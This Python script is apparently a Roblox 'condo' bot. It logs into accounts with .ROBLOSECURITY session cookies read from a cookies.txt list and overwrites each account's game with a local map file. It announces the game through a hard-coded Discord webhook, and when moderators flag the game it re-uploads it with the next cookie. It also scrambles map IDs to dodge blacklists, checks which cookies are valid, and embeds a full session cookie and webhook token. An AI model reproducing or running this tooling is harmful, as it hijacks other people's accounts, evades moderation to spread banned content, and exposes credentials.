import sys
import time
import random
from requests import post, get
import requests
from os import name as os_name, system
from discord import Webhook, RequestsWebhookAdapter
import codecs
import json
import discord
import secrets
from unblacklister import uniqueId, referentt
from advertise import adervrtise
import os
import lxml.etree
import random
from xml.dom import minidom
from xml.etree import ElementTree as etree






def main(cookie):
    uniqueId()
    referentt()
    token = post("https://auth.roblox.com/v2/logout",
                 cookies={
                     ".ROBLOSECURITY": cookie
                 }).headers['X-CSRF-TOKEN']
    userId = requests.get("https://users.roblox.com/v1/users/authenticated",
                          headers={
                              'x-csrf-token': token,
                              'User-Agent': 'Roblox',
                                "Connection": "keep-alive"
                          },
                          cookies={
                              '.ROBLOSECURITY': cookie
                          }).json()["id"]
    print(f" [Reborn] {userId}- UserID")
    gameId = requests.get("https://inventory.roblox.com/v2/users/" +
                          str(userId) + "/inventory/9?limit=10&sortOrder=Asc",
                          headers={
                              'x-csrf-token': token,
                              'User-Agent': 'Roblox'
                          },
                          cookies={
                              '.ROBLOSECURITY': cookie
                          }).json()["data"][0]["assetId"]
    print(f" [Reborn] {gameId} - GameID")
    myfiles = open("Baseplate.rbxlx", "rb").read()
    unvid = get(
        "https://api.roblox.com/universes/get-universe-containing-place?placeid="
        + str(gameId)).json()["UniverseId"]
    print(f" [Reborn] {unvid} - UniverseID")
    url = f"https://data.roblox.com/Data/Upload.ashx?assetid={str(gameId)}"

    url2 = f"https://develop.roblox.com/v2/universes/{str(unvid)}/configuration"

    avatartype = "MorphToR6"
    allowprivateservers = True

    gamedata = {
        "name": "hello",
        "description": "Hello",
        "universeAvatarType": avatartype,
        "universeAnimationType": "Standard",
        "allowPrivateServers": allowprivateservers,
        "privateServerPrice": 0,
        "permissions": {
            "IsThirdPartyPurchaseAllowed": True
        }
    }
    gamedata = json.dumps(gamedata)
    gameData = requests.patch(
        url2,
        headers={
            'Content-Type': 'application/json',
            'User-Agent':
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
            'x-csrf-token': token
        },
        cookies={'.ROBLOSECURITY': cookie},
        data=gamedata)
    gameData2 = {
        "maxPlayerCount": 100
    }
    gameData = requests.patch(
        url2,
        headers={
            'Content-Type': 'application/json',
            'User-Agent':
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
            'x-csrf-token': token
        },
        cookies={'.ROBLOSECURITY': cookie},
        data=gameData2)

    print(f" [Reborn] {gameData.status_code} - Successfull upload")
    upload = post(url,
                  headers={
                      'Content-Type': 'application/xml',
                      'User-Agent': 'Roblox',
                      'x-csrf-token': token
                  },
                  cookies={'.ROBLOSECURITY': cookie},
                  data=myfiles)
    if upload.status_code == 200:
        webhook = Webhook.from_url(
            "https://discord.com/api/webhooks/909985389886963775/de8TXAHLIlt9A3_kfy0PEi06-jYt-3fD-r59nKkiHhkBi8Ii9fDMO27q4gMYaTjsVb4H",
            adapter=RequestsWebhookAdapter())
        webhook.send("<@&909983565490561068>")
        e = discord.Embed(title="🎮 𝐂𝐎𝐍𝐃𝐎 𝐁𝐎𝐓",
                          description="New game has been posted. -- https://discord.gg/YnrsmjG6nh",
        					color=0xbd10e0)
        e.add_field(name="Max Players", value="100", inline=True)
        e.add_field(name="Avatar Type", value="R6", inline=True)
        e.add_field(name="Private Servers",
                    value=":white_check_mark:",
                    inline=True)
        e.add_field(
            name="Game Link",
            value=
            f"[Click here to play!](https://www.roblox.com/games/{gameId}/)",
            inline=True)
        e.set_thumbnail(
            url=
            'https://cdn.discordapp.com/icons/901740883832090675/a_22079b7bc25d89e30d36d9c7e63243f9.webp?size=96'
        )
        webhook.send(embed=e)
        adervrtise(gameId)
    while True:
        time.sleep(60)
        cookie2 = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_B31BDA4E910A4BC23839CF62FBFC1E4923758E77C0B05E15BCD1F66E8DD6E227C0BB47614092543355CFF8655808BF7C4B7847780D4F8271CD460F1C8F039CC7B79524DAAF3292983262BC83DD21EF32A47E220EF44EF90F34E23E4A029441E27AC16CFDA84B391A0860F9A3B34FCCE1BFF8B5F95B2121009B522ECADE1DECDFA828C8024D243C26D9C54012FBA61AF0D4CEE553A3568F377B4552FDD03BEA2EA0C2902B1B0ACFE626482B55B4FBEC841F3D4B0A21E6F47D04B4C1A51EC2631CE27A04152273EC88460D00B0BB94DBD5F030A9BA034A81A086FEE7104DBF0EC548FB6ED526C8555FEF461DAB77B25D2D29AF49848222155CBE9393168D492E75E898915E6FB3DD422EAFE0313A9724C9A3D13A1C31E58AD7901E2CD6C2B5036DC8BBD9108FE5CC8BB2739BAABA0F50C52460DDFC3E9E92AD972457D375EE7AE957D7B9AC35A295055559392934718EB88791EBCC"
        sheesh = get(f"https://games.roblox.com/v1/games/multiget-playability-status?universeIds={unvid}",headers={'x-csrf-token': token,'User-Agent': 'Roblox'},cookies={'.ROBLOSECURITY': cookie2 }).json()
        sheesh = sheesh[0]['playabilityStatus']
        if sheesh == 'UnderReview':
            print(f" [Reborn] Condo banned uploaded another now")
            def start():
                k = 1
                filename = 'cookies.txt'
                with open(filename) as file:
                    lines = file.read().splitlines()

                if len(lines) > k:
                    random_lines = random.sample(lines, k)
                    with open(filename, 'w') as output_file:
                        output_file.writelines(line + "\n"
                        for line in lines if line not in random_lines)
                    main("\n".join(random_lines))
                elif lines: # file is too small
                    print("\n".join(lines)) # print all lines
                    with open(filename, 'wb', 0): # empty the file
                                pass 
                

            start()

if __name__ == "__main__":
    from termcolor import colored
    clear = lambda: system('cls')
    def sendmsg():
        clear()
        print('''                                                                     
                        )                              (                          
            (     (  ( /(      (                       )\ )            ) (        
            )(   ))\ )\())  (  )(   (     (  (   (    (()/( (  (    ( /( )\ ) (   
            (()\ /((_|(_)\   )\(()\  )\ )  )\ )\  )\ )  ((_)))\ )\   )\()|()/( )\  
            ((_|_)) | |(_) ((_)((_)_(_/( ((_|(_)_(_/(  _| |((_|(_) ((_)\ )(_)|(_) 
            | '_/ -_)| '_ \/ _ \ '_| ' \)) _/ _ \ ' \)) _` / _ (_-<_\ \ /| || |_ / 
            |_| \___||_.__/\___/_| |_||_|\__\___/_||_|\__,_\___/__(_)_\_\ \_, /__| 
                                                                        |__/     
            ----------------------------------------------------------------------
            |           1. Unblacklist  2. Check Cookies  3. Upload              |
            ----------------------------------------------------------------------

        ''')
        input22 = input(" \n    > Please Enter Task:  ")
        if input22 == "3":
            def start():
                k = 1
                filename = 'cookies.txt'
                with open(filename) as file:
                    lines = file.read().splitlines()

                if len(lines) > k:
                    random_lines = random.sample(lines, k)
                    with open(filename, 'w') as output_file:
                        output_file.writelines(line + "\n"
                        for line in lines if line not in random_lines)
                    main("\n".join(random_lines))
                elif lines: # file is too small
                    print("\n".join(lines)) # print all lines
                    with open(filename, 'wb', 0): # empty the file
                                pass 
            start()
        elif input22 == "1":
            filename = input(" \n    [Reborn] Please enter file name with .rbxlx extension:  ")
            file = filename

            doc = lxml.etree.parse(file)
            def uniqueId():
                for el in doc.xpath("//UniqueId[@name='UniqueId']"):
                    el.text = f'{secrets.token_hex(17)}'
                doc.write (file)
            def referentt():
                for el in doc.xpath("//Item[@referent]"):
                    string = ''.join(random.choice('0123456789ABCDEF') for i in range(33))
                    el.attrib['referent'] = f'RBX{string}'
                doc.write (file)

            referentt()
            uniqueId()
            print("\n [Reborn] Successfully unblacklisted map")
            time.sleep(5)
            sendmsg()
        elif input22 == "2":
            req = requests.Session()
            cookiefilefolder = os.path.dirname(__file__)
            cookiefile = (cookiefilefolder + "\cookies.txt")
            cookie = open(cookiefile).read().splitlines()
            validcount = 0
            invalidcount = 0

            if len(cookie) > 0:
                print(str(len(cookie)) + " Cookie(s) Found")
                print(" ")
                for line in cookie:
                    check = req.get('https://api.roblox.com/currency/balance', cookies={'.ROBLOSECURITY': str(line)})
                    if check.status_code == 200:
                        validcount += 1
                    else:
                        invalidcount += 1
                print(" [Eeborn] Valid Cookie(s): " + str(validcount) + "\n [Reborn] Invalid Cookie(s):" + str(invalidcount))
                time.sleep(5)
                sendmsg()
            else:
                print(" [Reborn] No cookies found.")

    sendmsg()

        
